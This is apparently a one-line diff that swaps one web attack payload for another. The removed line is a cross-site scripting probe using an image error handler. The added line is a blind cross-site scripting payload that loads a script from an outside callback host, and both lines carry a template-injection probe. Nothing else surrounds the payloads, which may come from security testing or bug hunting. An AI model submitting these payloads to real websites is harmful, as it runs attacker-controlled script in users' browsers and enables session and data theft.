@@ -1,1 +1,1 @@
-'"><img src=x onerror=prompt(document.domain)>{{7*7}}
+'"><script src=https://aji99.xss.ht></script>{{7*7}}
